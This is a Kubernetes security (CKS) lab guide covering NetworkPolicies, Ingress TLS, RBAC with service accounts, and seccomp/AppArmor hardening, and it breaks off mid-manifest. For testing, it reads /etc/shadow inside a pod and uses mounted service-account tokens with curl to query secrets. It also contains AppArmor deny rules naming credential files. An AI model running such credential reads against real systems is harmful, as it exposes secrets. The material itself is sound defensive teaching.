# CKS Complete Master Guide
## Certified Kubernetes Security Specialist - Full Lab Guide

**Author:** Saleem Ali  
**Certification:** CKS (Certified Kubernetes Security Specialist)  
**Level:** Advanced | **Duration:** 2 hours | **Passing:** 67%  
**GitHub:** https://github.com/ali4210  
**LinkedIn:** https://www.linkedin.com/in/saleem-ali-189719325/

---

## 🎯 About CKS

**Certified Kubernetes Security Specialist** - Advanced security certification.

**⚠️ PREREQUISITE: Valid CKA certification required!**

**Exam:** Performance-based | 2 hours | 67% passing | $395 USD

---

## 🖥️ Lab Environments

### Minikube (Basic Security)
Single-node for basic concepts

### Kubeadm Multi-Node (⭐ REQUIRED FOR CKS!)
```
Master (Kali) + Workers (Parrot/Ubuntu)
With: Calico, Falco, Trivy, AppArmor, Audit Logging
```

**CKS requires multi-node cluster security scenarios!**

---


Lab 1: Securing Cluster Networking
Objectives

By the end of this lab, you will be able to:

• Understand and implement Kubernetes NetworkPolicies for Pod-to-Pod communication control • Create namespace-level network isolation using NetworkPolicies • Deploy and configure Ingress resources with TLS termination • Generate and apply SSL/TLS certificates for secure HTTPS routing • Test and verify network security policies and secure routing configurations • Troubleshoot common networking security issues in Kubernetes clusters
Prerequisites

Before starting this lab, you should have:

• Basic understanding of Kubernetes concepts (Pods, Services, Namespaces) • Familiarity with YAML configuration files • Basic knowledge of networking concepts (TCP/IP, DNS, HTTP/HTTPS) • Understanding of SSL/TLS certificates and encryption • Experience with command-line interface (CLI) operations • Knowledge of kubectl commands for Kubernetes cluster management
Lab Environment Setup

Ready-to-Use Cloud Machines: Al Nafi provides pre-configured Linux-based cloud machines with Kubernetes clusters already set up. Simply click Start Lab to access your environment - no need to build your own VM or install Kubernetes from scratch.

Your lab environment includes: • A running Kubernetes cluster with multiple nodes • kubectl CLI tool pre-installed and configured • OpenSSL for certificate generation • NGINX Ingress Controller pre-installed • All necessary networking components configured
Task 1: Create and Apply NetworkPolicies for Pod-to-Pod Communication
Subtask 1.1: Set Up Test Namespaces and Applications

First, we'll create separate namespaces to demonstrate network isolation.

# Create namespaces for our lab
kubectl create namespace frontend
kubectl create namespace backend
kubectl create namespace database

Deploy test applications in each namespace:

# Deploy frontend application
kubectl create deployment web-frontend --image=nginx:latest -n frontend
kubectl expose deployment web-frontend --port=80 --target-port=80 -n frontend

# Deploy backend application
kubectl create deployment api-backend --image=httpd:latest -n backend
kubectl expose deployment api-backend --port=80 --target-port=80 -n backend

# Deploy database application
kubectl create deployment db-server --image=postgres:13 -n database
kubectl expose deployment db-server --port=5432 --target-port=5432 -n database

Verify all deployments are running:

kubectl get pods -n frontend
kubectl get pods -n backend
kubectl get pods -n database

Subtask 1.2: Test Default Network Communication

Before applying NetworkPolicies, let's verify that pods can communicate across namespaces by default.

# Get the IP address of the backend service
kubectl get svc -n backend

# Create a test pod to check connectivity
kubectl run test-pod --image=busybox --rm -it --restart=Never -- /bin/sh

Inside the test pod, try to reach services in different namespaces:

# Test connectivity to backend service
wget -qO- http://api-backend.backend.svc.cluster.local

# Test connectivity to database service
nc -zv db-server.database.svc.cluster.local 5432

# Exit the test pod
exit

Subtask 1.3: Create NetworkPolicy for Backend Namespace

Create a NetworkPolicy that only allows traffic from the frontend namespace to the backend namespace.

Create a file named backend-network-policy.yaml:

apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: backend-network-policy
  namespace: backend
spec:
  podSelector: {}
  policyTypes:
  - Ingress
  - Egress
  ingress:
  - from:
    - namespaceSelector:
        matchLabels:
          name: frontend
    ports:
    - protocol: TCP
      port: 80
  egress:
  - to:
    - namespaceSelector:
        matchLabels:
          name: database
    ports:
    - protocol: TCP
      port: 5432
  - to: {}
    ports:
    - protocol: UDP
      port: 53

Apply the NetworkPolicy:

# First, label the namespaces for the policy to work
kubectl label namespace frontend name=frontend
kubectl label namespace backend name=backend
kubectl label namespace database name=database

# Apply the NetworkPolicy
kubectl apply -f backend-network-policy.yaml

Subtask 1.4: Create NetworkPolicy for Database Namespace

Create a NetworkPolicy that only allows traffic from the backend namespace to the database namespace.

Create a file named database-network-policy.yaml:

apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: database-network-policy
  namespace: database
spec:
  podSelector: {}
  policyTypes:
  - Ingress
  ingress:
  - from:
    - namespaceSelector:
        matchLabels:
          name: backend
    ports:
    - protocol: TCP
      port: 5432

Apply the NetworkPolicy:

kubectl apply -f database-network-policy.yaml

Subtask 1.5: Create NetworkPolicy for Frontend Namespace

Create a NetworkPolicy for the frontend namespace that allows ingress traffic and egress to backend.

Create a file named frontend-network-policy.yaml:

apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: frontend-network-policy
  namespace: frontend
spec:
  podSelector: {}
  policyTypes:
  - Ingress
  - Egress
  ingress:
  - {}
  egress:
  - to:
    - namespaceSelector:
        matchLabels:
          name: backend
    ports:
    - protocol: TCP
      port: 80
  - to: {}
    ports:
    - protocol: UDP
      port: 53

Apply the NetworkPolicy:

kubectl apply -f frontend-network-policy.yaml

Task 2: Deploy Ingress Resource with TLS Termination
Subtask 2.1: Generate SSL/TLS Certificate

Create a self-signed certificate for testing purposes:

# Create a private key
openssl genrsa -out tls.key 2048

# Create a certificate signing request
openssl req -new -key tls.key -out tls.csr -subj "/CN=secure-app.local/O=secure-app"

# Generate the certificate
openssl x509 -req -in tls.csr -signkey tls.key -out tls.crt -days 365

Create a Kubernetes secret with the certificate:

kubectl create secret tls secure-app-tls --cert=tls.crt --key=tls.key -n frontend

Subtask 2.2: Create Ingress Resource with TLS

Create a file named secure-ingress.yaml:

apiVersion: networking.k8s.io/v1
kind: Ingress
metadata:
  name: secure-app-ingress
  namespace: frontend
  annotations:
    nginx.ingress.kubernetes.io/ssl-redirect: "true"
    nginx.ingress.kubernetes.io/force-ssl-redirect: "true"
spec:
  tls:
  - hosts:
    - secure-app.local
    secretName: secure-app-tls
  rules:
  - host: secure-app.local
    http:
      paths:
      - path: /
        pathType: Prefix
        backend:
          service:
            name: web-frontend
            port:
              number: 80

Apply the Ingress resource:

kubectl apply -f secure-ingress.yaml

Subtask 2.3: Configure Local DNS Resolution

Add an entry to your local hosts file to resolve the domain:

# Get the Ingress Controller's external IP
kubectl get svc -n ingress-nginx

# Add entry to hosts file (replace <EXTERNAL-IP> with actual IP)
echo "<EXTERNAL-IP> secure-app.local" | sudo tee -a /etc/hosts

Task 3: Verify Secure HTTPS Routing and Test Network Isolation
Subtask 3.1: Test HTTPS Routing

Verify that the Ingress is working with TLS termination:

# Check Ingress status
kubectl get ingress -n frontend

# Test HTTPS connectivity
curl -k https://secure-app.local

# Test HTTP redirect to HTTPS
curl -I http://secure-app.local

Subtask 3.2: Test Network Policy Isolation

Create test pods to verify network isolation:

# Create a test pod in the frontend namespace
kubectl run frontend-test --image=busybox --rm -it --restart=Never -n frontend -- /bin/sh

Inside the frontend test pod:

# This should work - frontend to backend
wget -qO- http://api-backend.backend.svc.cluster.local

# This should fail - frontend to database (blocked by policy)
nc -zv db-server.database.svc.cluster.local 5432

exit

Create a test pod in an unlabeled namespace:

# Create a new namespace without labels
kubectl create namespace test-isolation

# Create a test pod in the unlabeled namespace
kubectl run isolation-test --image=busybox --rm -it --restart=Never -n test-isolation -- /bin/sh

Inside the isolation test pod:

# This should fail - unlabeled namespace to backend
wget -qO- http://api-backend.backend.svc.cluster.local

# This should fail - unlabeled namespace to database
nc -zv db-server.database.svc.cluster.local 5432

exit

Subtask 3.3: Verify NetworkPolicy Rules

Check the applied NetworkPolicies:

# List all NetworkPolicies
kubectl get networkpolicies --all-namespaces

# Describe specific policies
kubectl describe networkpolicy backend-network-policy -n backend
kubectl describe networkpolicy database-network-policy -n database
kubectl describe networkpolicy frontend-network-policy -n frontend

Subtask 3.4: Test Certificate Validation

Verify the certificate details:

# Check certificate information
openssl x509 -in tls.crt -text -noout

# Test certificate with curl
curl -vk https://secure-app.local 2>&1 | grep -A 10 "Server certificate"

Troubleshooting Common Issues
NetworkPolicy Not Working

If NetworkPolicies are not blocking traffic as expected:

# Check if your CNI plugin supports NetworkPolicies
kubectl get nodes -o wide

# Verify NetworkPolicy is applied
kubectl get networkpolicy --all-namespaces

# Check pod labels and namespace labels
kubectl get namespaces --show-labels
kubectl get pods --show-labels -n backend

Ingress TLS Issues

If HTTPS is not working properly:

# Check Ingress Controller logs
kubectl logs -n ingress-nginx -l app.kubernetes.io/name=ingress-nginx

# Verify certificate secret
kubectl describe secret secure-app-tls -n frontend

# Check Ingress status
kubectl describe ingress secure-app-ingress -n frontend

DNS Resolution Problems

If domain names are not resolving:

# Test DNS resolution from within cluster
kubectl run dns-test --image=busybox --rm -it --restart=Never -- nslookup secure-app.local

# Check CoreDNS logs
kubectl logs -n kube-system -l k8s-app=kube-dns

Lab Validation
Validation Checklist

Verify your lab completion by checking the following:

    NetworkPolicies Applied: All three NetworkPolicies are created and active
    Network Isolation Working: Traffic is properly restricted between namespaces
    TLS Certificate Created: SSL certificate is generated and stored as Kubernetes secret
    Ingress with TLS: Ingress resource is configured with TLS termination
    HTTPS Routing: Secure HTTPS traffic is properly routed to the frontend service
    HTTP to HTTPS Redirect: HTTP requests are automatically redirected to HTTPS

Final Verification Commands

Run these commands to validate your setup:

# Check all NetworkPolicies
kubectl get networkpolicy --all-namespaces

# Verify Ingress with TLS
kubectl get ingress -n frontend

# Test HTTPS endpoint
curl -k -I https://secure-app.local

# Verify certificate
kubectl get secret secure-app-tls -n frontend

Cleanup

To clean up the lab environment:

# Delete namespaces (this will delete all resources within them)
kubectl delete namespace frontend backend database test-isolation

# Remove hosts file entry
sudo sed -i '/secure-app.local/d' /etc/hosts

# Clean up certificate files
rm -f tls.key tls.csr tls.crt
rm -f backend-network-policy.yaml database-network-policy.yaml frontend-network-policy.yaml secure-ingress.yaml

Conclusion

In this lab, you have successfully:

• Implemented NetworkPolicies to control Pod-to-Pod communication and create namespace-level network isolation • Deployed secure Ingress resources with TLS termination using SSL certificates • Configured HTTPS routing with automatic HTTP to HTTPS redirection • Tested and verified network security policies to ensure proper traffic restriction • Gained hands-on experience with Kubernetes security best practices for cluster networking

This lab demonstrates critical security concepts for the Certified Kubernetes Security Specialist (CKS) certification. Network security is fundamental to protecting Kubernetes clusters in production environments. The skills you've learned here - including NetworkPolicy implementation, TLS certificate management, and secure Ingress configuration - are essential for maintaining secure, production-ready Kubernetes deployments.

Understanding these networking security concepts helps you build defense-in-depth strategies, ensuring that even if one security layer is compromised, additional layers provide continued protection for your applications and data.




Lab 2: Role-Based Access Control (RBAC) and Service Accounts
Objectives

By the end of this lab, you will be able to:

• Understand the fundamentals of Kubernetes Role-Based Access Control (RBAC) • Create and configure custom Roles and RoleBindings to restrict namespace access • Set up custom Service Accounts with minimal required permissions • Test and verify API access restrictions using different service accounts • Implement security best practices for Kubernetes workload authentication • Troubleshoot common RBAC configuration issues
Prerequisites

Before starting this lab, you should have:

• Basic understanding of Kubernetes concepts (Pods, Namespaces, Services) • Familiarity with kubectl command-line tool • Knowledge of YAML file structure and syntax • Understanding of Linux command-line operations • Completion of basic Kubernetes administration tasks
Lab Environment Setup

Ready-to-Use Cloud Machines: Al Nafi provides pre-configured Linux-based cloud machines with Kubernetes already installed. Simply click Start Lab to access your environment - no need to build your own VM or install additional software.

Your lab environment includes: • Ubuntu 20.04 LTS with kubectl pre-installed • Kubernetes cluster (single-node for lab purposes) • All necessary RBAC permissions for cluster administration • Text editors (nano, vim) for file editing
Task 1: Create Roles and Role Bindings for Namespace Access Control
Subtask 1.1: Create a Dedicated Namespace

First, we'll create a dedicated namespace to demonstrate RBAC controls.

    Create a new namespace called secure-app:

kubectl create namespace secure-app

    Verify the namespace creation:

kubectl get namespaces

You should see the secure-app namespace listed among the existing namespaces.
Subtask 1.2: Create a Custom Role with Limited Permissions

Now we'll create a Role that grants specific permissions within our namespace.

    Create a Role definition file:

nano pod-reader-role.yaml

    Add the following YAML content:

apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata:
  namespace: secure-app
  name: pod-reader
rules:
- apiGroups: [""]
  resources: ["pods"]
  verbs: ["get", "list", "watch"]
- apiGroups: [""]
  resources: ["pods/log"]
  verbs: ["get", "list"]

    Apply the Role configuration:

kubectl apply -f pod-reader-role.yaml

    Verify the Role creation:

kubectl get roles -n secure-app

Subtask 1.3: Create a User Account for Testing

For demonstration purposes, we'll create a certificate-based user account.

    Generate a private key for the user:

openssl genrsa -out developer.key 2048

    Create a certificate signing request:

openssl req -new -key developer.key -out developer.csr -subj "/CN=developer/O=development"

    Create a CertificateSigningRequest resource:

cat <<EOF | kubectl apply -f -
apiVersion: certificates.k8s.io/v1
kind: CertificateSigningRequest
metadata:
  name: developer-csr
spec:
  request: $(cat developer.csr | base64 | tr -d '\n')
  signerName: kubernetes.io/kube-apiserver-client
  usages:
  - client auth
EOF

    Approve the certificate request:

kubectl certificate approve developer-csr

    Extract the signed certificate:

kubectl get csr developer-csr -o jsonpath='{.status.certificate}' | base64 -d > developer.crt

Subtask 1.4: Create a RoleBinding

Now we'll bind our custom role to the developer user within the secure-app namespace.

    Create a RoleBinding definition file:

nano pod-reader-binding.yaml

    Add the following YAML content:

apiVersion: rbac.authorization.k8s.io/v1
kind: RoleBinding
metadata:
  name: pod-reader-binding
  namespace: secure-app
subjects:
- kind: User
  name: developer
  apiGroup: rbac.authorization.k8s.io
roleRef:
  kind: Role
  name: pod-reader
  apiGroup: rbac.authorization.k8s.io

    Apply the RoleBinding configuration:

kubectl apply -f pod-reader-binding.yaml

    Verify the RoleBinding creation:

kubectl get rolebindings -n secure-app

Task 2: Configure Custom Service Account with Minimal Permissions
Subtask 2.1: Create a Custom Service Account

Service accounts provide an identity for processes running in Pods.

    Create a custom service account:

kubectl create serviceaccount app-service-account -n secure-app

    Verify the service account creation:

kubectl get serviceaccounts -n secure-app

Subtask 2.2: Create a Minimal Permission Role for the Service Account

We'll create a role with very limited permissions for our application.

    Create a minimal role definition file:

nano app-minimal-role.yaml

    Add the following YAML content:

apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata:
  namespace: secure-app
  name: app-minimal-role
rules:
- apiGroups: [""]
  resources: ["configmaps"]
  verbs: ["get"]
- apiGroups: [""]
  resources: ["secrets"]
  verbs: ["get"]
  resourceNames: ["app-secret"]

    Apply the minimal role configuration:

kubectl apply -f app-minimal-role.yaml

Subtask 2.3: Bind the Service Account to the Minimal Role

    Create a RoleBinding for the service account:

nano app-service-binding.yaml

    Add the following YAML content:

apiVersion: rbac.authorization.k8s.io/v1
kind: RoleBinding
metadata:
  name: app-service-binding
  namespace: secure-app
subjects:
- kind: ServiceAccount
  name: app-service-account
  namespace: secure-app
roleRef:
  kind: Role
  name: app-minimal-role
  apiGroup: rbac.authorization.k8s.io

    Apply the service account binding:

kubectl apply -f app-service-binding.yaml

Subtask 2.4: Create Test Resources

Let's create some resources to test our permissions.

    Create a ConfigMap:

kubectl create configmap app-config --from-literal=database_url=localhost:5432 -n secure-app

    Create a Secret:

kubectl create secret generic app-secret --from-literal=api_key=super-secret-key -n secure-app

    Create another Secret (for testing restrictions):

kubectl create secret generic restricted-secret --from-literal=admin_password=admin123 -n secure-app

Task 3: Test API Access with Different Service Accounts
Subtask 3.1: Create Test Pods with Different Service Accounts

    Create a Pod using the default service account:

nano default-sa-pod.yaml

    Add the following YAML content:

apiVersion: v1
kind: Pod
metadata:
  name: default-sa-pod
  namespace: secure-app
spec:
  serviceAccountName: default
  containers:
  - name: test-container
    image: nginx:1.21
    command: ["sleep", "3600"]

    Create a Pod using the custom service account:

nano custom-sa-pod.yaml

    Add the following YAML content:

apiVersion: v1
kind: Pod
metadata:
  name: custom-sa-pod
  namespace: secure-app
spec:
  serviceAccountName: app-service-account
  containers:
  - name: test-container
    image: nginx:1.21
    command: ["sleep", "3600"]

    Apply both Pod configurations:

kubectl apply -f default-sa-pod.yaml
kubectl apply -f custom-sa-pod.yaml

    Wait for Pods to be ready:

kubectl wait --for=condition=Ready pod/default-sa-pod -n secure-app --timeout=60s
kubectl wait --for=condition=Ready pod/custom-sa-pod -n secure-app --timeout=60s

Subtask 3.2: Test API Access from Default Service Account Pod

    Install curl in the default service account Pod:

kubectl exec -it default-sa-pod -n secure-app -- apt-get update && apt-get install -y curl

    Test accessing the Kubernetes API from inside the Pod:

kubectl exec -it default-sa-pod -n secure-app -- bash -c '
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
CACERT=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
curl -H "Authorization: Bearer $TOKEN" --cacert $CACERT https://kubernetes.default.svc/api/v1/namespaces/secure-app/pods
'

Expected Result: The default service account should have limited access and may receive a 403 Forbidden error.
Subtask 3.3: Test API Access from Custom Service Account Pod

    Install curl in the custom service account Pod:

kubectl exec -it custom-sa-pod -n secure-app -- apt-get update && apt-get install -y curl

    Test accessing allowed resources (ConfigMaps):

kubectl exec -it custom-sa-pod -n secure-app -- bash -c '
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
CACERT=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
curl -H "Authorization: Bearer $TOKEN" --cacert $CACERT https://kubernetes.default.svc/api/v1/namespaces/secure-app/configmaps
'

    Test accessing allowed secrets (app-secret):

kubectl exec -it custom-sa-pod -n secure-app -- bash -c '
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
CACERT=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
curl -H "Authorization: Bearer $TOKEN" --cacert $CACERT https://kubernetes.default.svc/api/v1/namespaces/secure-app/secrets/app-secret
'

    Test accessing restricted secrets (should fail):

kubectl exec -it custom-sa-pod -n secure-app -- bash -c '
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
CACERT=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
curl -H "Authorization: Bearer $TOKEN" --cacert $CACERT https://kubernetes.default.svc/api/v1/namespaces/secure-app/secrets/restricted-secret
'

Expected Result: The first two commands should succeed, while the third should return a 403 Forbidden error.
Subtask 3.4: Test Cross-Namespace Access Restrictions

    Try to access resources in the default namespace:

kubectl exec -it custom-sa-pod -n secure-app -- bash -c '
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
CACERT=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
curl -H "Authorization: Bearer $TOKEN" --cacert $CACERT https://kubernetes.default.svc/api/v1/namespaces/default/pods
'

Expected Result: This should fail with a 403 Forbidden error, demonstrating namespace isolation.
Task 4: Verify and Troubleshoot RBAC Configuration
Subtask 4.1: Use kubectl auth Commands for Verification

    Check what the custom service account can do:

kubectl auth can-i --list --as=system:serviceaccount:secure-app:app-service-account -n secure-app

    Test specific permissions:

kubectl auth can-i get configmaps --as=system:serviceaccount:secure-app:app-service-account -n secure-app
kubectl auth can-i get secrets --as=system:serviceaccount:secure-app:app-service-account -n secure-app
kubectl auth can-i delete pods --as=system:serviceaccount:secure-app:app-service-account -n secure-app

    Check permissions for the developer user:

kubectl auth can-i get pods --as=developer -n secure-app
kubectl auth can-i create pods --as=developer -n secure-app

Subtask 4.2: Review RBAC Configuration

    Display detailed information about roles:

kubectl describe role pod-reader -n secure-app
kubectl describe role app-minimal-role -n secure-app

    Display detailed information about role bindings:

kubectl describe rolebinding pod-reader-binding -n secure-app
kubectl describe rolebinding app-service-binding -n secure-app

Subtask 4.3: Common Troubleshooting Steps

    Check for typos in resource names:

kubectl get roles,rolebindings -n secure-app

    Verify service account exists:

kubectl get serviceaccounts -n secure-app

    Check Pod service account assignment:

kubectl get pod custom-sa-pod -n secure-app -o yaml | grep serviceAccount

Troubleshooting Tips
Common Issues and Solutions

Issue: 403 Forbidden errors when testing API access Solution:

    Verify the RoleBinding is correctly configured
    Check that the service account name matches exactly
    Ensure you're testing in the correct namespace

Issue: Service account token not found in Pod Solution:

    Verify the service account exists in the same namespace as the Pod
    Check that the Pod specification includes the correct serviceAccountName

Issue: Role permissions not working as expected Solution:

    Review the Role definition for correct apiGroups, resources, and verbs
    Use kubectl auth can-i commands to test specific permissions
    Check for typos in resource names or API groups

Issue: Cross-namespace access when it shouldn't be allowed Solution:

    Verify you're using Roles (namespace-scoped) instead of ClusterRoles
    Check that RoleBindings are created in the correct namespace

Cleanup

To clean up the resources created in this lab:

# Delete Pods
kubectl delete pod default-sa-pod custom-sa-pod -n secure-app

# Delete RBAC resources
kubectl delete rolebinding pod-reader-binding app-service-binding -n secure-app
kubectl delete role pod-reader app-minimal-role -n secure-app

# Delete service account
kubectl delete serviceaccount app-service-account -n secure-app

# Delete test resources
kubectl delete configmap app-config -n secure-app
kubectl delete secret app-secret restricted-secret -n secure-app

# Delete certificate signing request
kubectl delete csr developer-csr

# Delete namespace (this will delete all remaining resources in the namespace)
kubectl delete namespace secure-app

# Clean up local files
rm -f pod-reader-role.yaml pod-reader-binding.yaml app-minimal-role.yaml app-service-binding.yaml
rm -f default-sa-pod.yaml custom-sa-pod.yaml
rm -f developer.key developer.csr developer.crt

Conclusion

In this lab, you have successfully:

• Implemented Role-Based Access Control (RBAC) by creating custom Roles with specific permissions limited to a single namespace • Configured Service Accounts with minimal required permissions following the principle of least privilege • Created and tested RoleBindings to associate users and service accounts with appropriate roles • Verified access restrictions by testing API calls from different service accounts and confirming that unauthorized actions are blocked • Learned troubleshooting techniques for RBAC configurations using kubectl auth commands

Why This Matters: RBAC is a critical security feature in Kubernetes that helps prevent unauthorized access to cluster resources. By implementing proper RBAC controls, you ensure that applications and users can only access the resources they need to function, reducing the attack surface and potential for security breaches. This is especially important in multi-tenant environments and is a key requirement for the Certified Kubernetes Security Specialist (CKS) certification.

The skills you've developed in this lab are essential for:

    Securing production Kubernetes clusters
    Implementing compliance requirements
    Following security best practices
    Preparing for advanced Kubernetes security certifications

Remember to always apply the principle of least privilege when configuring RBAC in production environments, and regularly audit your RBAC configurations to ensure they remain appropriate as your applications and requirements evolve.





Lab 3: System Hardening with seccomp and AppArmor
Objectives

By the end of this lab, you will be able to:

• Understand the fundamentals of seccomp (secure computing mode) and AppArmor security frameworks • Configure and apply seccomp profiles to restrict system calls in Kubernetes Pods • Create and implement AppArmor profiles to control file and process access • Verify security profile enforcement through practical testing • Troubleshoot common issues with security profile implementation • Apply security hardening best practices in containerized environments
Prerequisites

Before starting this lab, you should have:

• Basic understanding of Linux operating systems and command-line interface • Fundamental knowledge of Kubernetes concepts (Pods, containers, YAML manifests) • Familiarity with container security concepts • Basic understanding of Linux file permissions and process management • Knowledge of YAML syntax and structure
Lab Environment Setup

Ready-to-Use Cloud Machines: Al Nafi provides pre-configured Linux-based cloud machines with all necessary tools installed. Simply click Start Lab to access your environment - no need to build your own VM or install additional software.

Your lab environment includes: • Ubuntu 20.04 LTS with Kubernetes cluster • Docker runtime with seccomp support • AppArmor utilities pre-installed • kubectl configured and ready to use
Task 1: Understanding and Configuring seccomp Profiles
Subtask 1.1: Verify seccomp Support

First, let's verify that your system supports seccomp and check the current configuration.

    Check seccomp support in the kernel:

grep CONFIG_SECCOMP /boot/config-$(uname -r)

    Verify Docker seccomp support:

docker info | grep -i seccomp

    Check existing seccomp profiles:

ls -la /var/lib/kubelet/seccomp/

Subtask 1.2: Create a Custom seccomp Profile

Now we'll create a restrictive seccomp profile that blocks potentially dangerous system calls.

    Create a directory for seccomp profiles:

sudo mkdir -p /var/lib/kubelet/seccomp/profiles

    Create a restrictive seccomp profile:

sudo tee /var/lib/kubelet/seccomp/profiles/restricted-profile.json > /dev/null << 'EOF'
{
    "defaultAction": "SCMP_ACT_ERRNO",
    "architectures": [
        "SCMP_ARCH_X86_64",
        "SCMP_ARCH_X86",
        "SCMP_ARCH_X32"
    ],
    "syscalls": [
        {
            "names": [
                "accept",
                "accept4",
                "access",
                "arch_prctl",
                "bind",
                "brk",
                "capget",
                "capset",
                "chdir",
                "chmod",
                "chown",
                "close",
                "connect",
                "dup",
                "dup2",
                "epoll_create",
                "epoll_ctl",
                "epoll_wait",
                "execve",
                "exit",
                "exit_group",
                "fcntl",
                "fstat",
                "futex",
                "getcwd",
                "getdents",
                "getegid",
                "geteuid",
                "getgid",
                "getgroups",
                "getpeername",
                "getpgrp",
                "getpid",
                "getppid",
                "getrlimit",
                "getsockname",
                "getsockopt",
                "getuid",
                "listen",
                "lseek",
                "lstat",
                "madvise",
                "mmap",
                "mprotect",
                "munmap",
                "nanosleep",
                "open",
                "openat",
                "pipe",
                "poll",
                "prctl",
                "read",
                "readlink",
                "rt_sigaction",
                "rt_sigprocmask",
                "rt_sigreturn",
                "sched_getaffinity",
                "sched_yield",
                "select",
                "set_robust_list",
                "setgid",
                "setgroups",
                "setuid",
                "socket",
                "socketpair",
                "stat",
                "statfs",
                "write"
            ],
            "action": "SCMP_ACT_ALLOW"
        }
    ]
}
EOF

    Verify the profile was created:

sudo cat /var/lib/kubelet/seccomp/profiles/restricted-profile.json | head -20

Subtask 1.3: Deploy a Pod with seccomp Profile

    Create a Pod manifest with seccomp profile:

cat > seccomp-pod.yaml << 'EOF'
apiVersion: v1
kind: Pod
metadata:
  name: seccomp-test-pod
  labels:
    app: seccomp-test
spec:
  securityContext:
    seccompProfile:
      type: Localhost
      localhostProfile: profiles/restricted-profile.json
  containers:
  - name: test-container
    image: ubuntu:20.04
    command: ["/bin/bash"]
    args: ["-c", "while true; do echo 'Container running with seccomp profile'; sleep 30; done"]
    securityContext:
      allowPrivilegeEscalation: false
      runAsNonRoot: true
      runAsUser: 1000
      capabilities:
        drop:
        - ALL
  restartPolicy: Never
EOF

    Deploy the Pod:

kubectl apply -f seccomp-pod.yaml

    Verify the Pod is running:

kubectl get pods seccomp-test-pod
kubectl describe pod seccomp-test-pod

Subtask 1.4: Test seccomp Profile Enforcement

    Test allowed system calls:

kubectl exec -it seccomp-test-pod -- /bin/bash -c "echo 'Testing allowed operations'; ls -la; pwd"

    Test blocked system calls (this should fail):

kubectl exec -it seccomp-test-pod -- /bin/bash -c "mount"

    Check Pod logs for any seccomp violations:

kubectl logs seccomp-test-pod

Task 2: Implementing AppArmor Profiles
Subtask 2.1: Verify AppArmor Status

    Check AppArmor status:

sudo apparmor_status

    List available AppArmor profiles:

sudo aa-status

    Check if AppArmor is enabled in Kubernetes:

kubectl get nodes -o jsonpath='{.items[*].status.nodeInfo.osImage}'

Subtask 2.2: Create a Custom AppArmor Profile

    Create an AppArmor profile directory:

sudo mkdir -p /etc/apparmor.d/containers

    Create a restrictive AppArmor profile:

sudo tee /etc/apparmor.d/containers.restricted-container > /dev/null << 'EOF'
#include <tunables/global>

profile containers.restricted-container flags=(attach_disconnected,mediate_deleted) {
  #include <abstractions/base>

  # Deny dangerous capabilities
  deny capability sys_admin,
  deny capability sys_module,
  deny capability sys_rawio,
  deny capability sys_ptrace,

  # Allow basic file operations in specific directories
  /bin/** ix,
  /usr/bin/** ix,
  /lib/** ix,
  /usr/lib/** ix,
  /lib64/** ix,
  /usr/lib64/** ix,

  # Allow read access to system files
  /etc/passwd r,
  /etc/group r,
  /etc/hostname r,
  /etc/hosts r,
  /etc/resolv.conf r,

  # Allow access to proc and sys (limited)
  /proc/*/stat r,
  /proc/*/status r,
  /proc/meminfo r,
  /proc/cpuinfo r,
  /sys/fs/cgroup/** r,

  # Allow temporary files
  /tmp/** rw,
  /var/tmp/** rw,

  # Allow home directory access (if running as user)
  /home/** rw,

  # Deny access to sensitive system directories
  deny /boot/** rwklx,
  deny /sys/** w,
  deny /proc/sys/** w,
  deny /etc/shadow r,
  deny /etc/sudoers r,

  # Network access
  network inet tcp,
  network inet udp,
  network inet6 tcp,
  network inet6 udp,

  # Allow signal operations
  signal (receive) set=(kill,term,int,hup,quit),
}
EOF

    Load the AppArmor profile:

sudo apparmor_parser -r /etc/apparmor.d/containers.restricted-container

    Verify the profile is loaded:

sudo aa-status | grep containers.restricted-container

Subtask 2.3: Deploy a Pod with AppArmor Profile

    Create a Pod manifest with AppArmor annotations:

cat > apparmor-pod.yaml << 'EOF'
apiVersion: v1
kind: Pod
metadata:
  name: apparmor-test-pod
  annotations:
    container.apparmor.security.beta.kubernetes.io/test-container: localhost/containers.restricted-container
  labels:
    app: apparmor-test
spec:
  containers:
  - name: test-container
    image: ubuntu:20.04
    command: ["/bin/bash"]
    args: ["-c", "while true; do echo 'Container running with AppArmor profile'; sleep 30; done"]
    securityContext:
      allowPrivilegeEscalation: false
      runAsNonRoot: true
      runAsUser: 1000
      capabilities:
        drop:
        - ALL
  restartPolicy: Never
EOF

    Deploy the Pod:

kubectl apply -f apparmor-pod.yaml

    Verify the Pod is running:

kubectl get pods apparmor-test-pod
kubectl describe pod apparmor-test-pod

Subtask 2.4: Test AppArmor Profile Enforcement

    Test allowed operations:

kubectl exec -it apparmor-test-pod -- /bin/bash -c "echo 'Testing allowed operations'; ls /tmp; echo 'test' > /tmp/testfile; cat /tmp/testfile"

    Test blocked operations (these should fail):

# Try to access sensitive files
kubectl exec -it apparmor-test-pod -- /bin/bash -c "cat /etc/shadow"

# Try to access boot directory
kubectl exec -it apparmor-test-pod -- /bin/bash -c "ls /boot"

    Check AppArmor logs for violations:

sudo dmesg | grep -i apparmor | tail -10

Task 3: Combining seccomp and AppArmor Profiles
Subtask 3.1: Create a Hardened Pod with Both Profiles

    Create a comprehensive Pod manifest:

cat > hardened-pod.yaml << 'EOF'
apiVersion: v1
kind: Pod
metadata:
  name: hardened-test-pod
  annotations:
    container.apparmor.security.beta.kubernetes.io/secure-container: localhost/containers.restricted-container
  labels:
    app: hardened-test
spec:
  securityContext:
    seccompProfile:
      type: Localhost
      localhostProfile: profiles/restricted-profile.json
    runAsNonRoot: true
    runAsUser: 1000
    fsGroup: 1000
  containers:
  - name: secure-container
